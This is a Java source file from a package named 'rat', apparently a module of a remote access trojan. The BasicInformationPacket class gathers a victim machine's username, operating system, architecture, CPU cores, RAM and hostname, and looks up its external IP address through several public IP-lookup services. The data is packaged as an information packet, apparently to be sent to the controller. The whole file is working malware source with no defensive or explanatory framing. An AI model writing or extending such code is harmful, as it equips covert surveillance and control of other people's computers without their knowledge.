package rat.packets;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.io.Serializable;
import java.lang.management.ManagementFactory;
import java.net.InetAddress;
import java.net.URL;

public class BasicInformationPacket implements IPacket, Serializable {

    private static final long serialVersionUID = 3419282629392409168L;

    private String userName, OS, OSArchitecture, computerName;
    private String externalIPAddress;
    private int cores;
    private long ram;

    @Override
    public void execute() {
        userName = System.getProperty("user.name");
        OS = System.getProperty("os.name");
        OSArchitecture = System.getProperty("os.arch");
        cores = Runtime.getRuntime().availableProcessors();

        com.sun.management.OperatingSystemMXBean mxbean =
                (com.sun.management.OperatingSystemMXBean) ManagementFactory.getOperatingSystemMXBean();
        ram = mxbean.getTotalPhysicalMemorySize();
        computerName = getHostname();
        externalIPAddress = getWANAddress();
    }

    private String getWANAddress() {
        final String[] websites = new String[]{
                "http://bot.whatismyipaddress.com",
                "http://checkip.amazonaws.com",
                "http://myexternalip.com/raw",
                "https://api.ipify.org",
                "https://icanhazip.com",
        };

        for (int i = 0; i < websites.length; i++) {
            try {
                URL ipURL = new URL(websites[i]);
                BufferedReader in = new BufferedReader(new InputStreamReader(ipURL.openStream()));
                return in.readLine(); // external IP address
            } catch (IOException e) {
            }
        }

        return "Not found";
    }

    @Override
    public PacketType getPacketType() {
        return PacketType.INFORMATION_DATA;
    }

    private String getHostname() {
        String hostName = "Unknown";
        try {
            InetAddress addr;
            addr = InetAddress.getLocalHost();
            hostName = addr.getHostName();
        } catch (IOException ex) {
        }

        return hostName;
    }

    public String getExternalIPAddress() {
        return externalIPAddress;
    }

    public String getUserName() {
        return userName;
    }

    public String getOS() {
        return OS;
    }

    public String getOSArchitecture() {
        return OSArchitecture;
    }

    public String getComputerName() {
        return computerName;
    }

    public int getCores() {
        return cores;
    }

    public long getRAM() {
        return ram;
    }

    @Override
    public boolean equals(Object o) {
        if (this == o) return true;
        if (o == null || getClass() != o.getClass()) return false;

        BasicInformationPacket that = (BasicInformationPacket) o;

        return userName != null ? userName.equals(that.userName) : that.userName == null;

    }

    @Override
    public int hashCode() {
        return userName != null ? userName.hashCode() : 0;
    }

}
